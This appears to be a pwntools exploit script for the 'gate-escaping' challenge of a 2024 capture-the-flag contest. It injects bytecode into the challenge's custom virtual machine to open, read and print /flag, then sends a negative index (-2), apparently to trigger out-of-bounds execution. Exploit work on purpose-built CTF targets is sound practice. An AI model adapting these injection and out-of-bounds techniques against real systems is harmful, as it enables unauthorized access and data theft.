from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = '172.17.0.4'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        #return remote(HOST, PORT)
        return remote("gate-escaping.chals.nitectf2024.live", 1337, ssl=True)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def set_reg(idx, val):
    return b'\x28' + (0xe1+idx).to_bytes(1, 'little') + val.to_bytes(1, 'little')
def sys_open():
    return b'\xff\x23'

def sys_write():
    return b'\xff\x2e'
def sys_read():
    return b'\xff\x2d'
def cjmp(idx, cond):
    return b'\x2b'+ cond.to_bytes(1, 'little') + (0xe1+idx).to_bytes(1, 'little')  

r = start()
if args.D:
    debug(r, [])

r.sendlineafter(b': ', b'1')
payload = b''
payload += b'/flag\x00aa'
payload += set_reg(0, 0xa0)
payload += set_reg(1, 0)
payload += set_reg(2, 0)
payload += set_reg(3, 0)
payload += sys_open()

#payload += set_reg(0, 5) #no need to set fd
payload += set_reg(1, 0)
payload += set_reg(2, 0xff)
payload += set_reg(3, 0)
payload += sys_read()

payload += set_reg(0, 1)
payload += set_reg(1, 0)
payload += set_reg(2, 0xff)
payload += set_reg(3, 0)
payload += sys_write()

payload = payload.ljust(0x60-10, b'\x2b')
payload += set_reg(0, 0xa8)
payload += cjmp(0, 0)
payload += b'b'*4
r.sendafter(b': ', payload)

pause()
r.sendlineafter(b': ', b'-2')

r.interactive()
r.close()

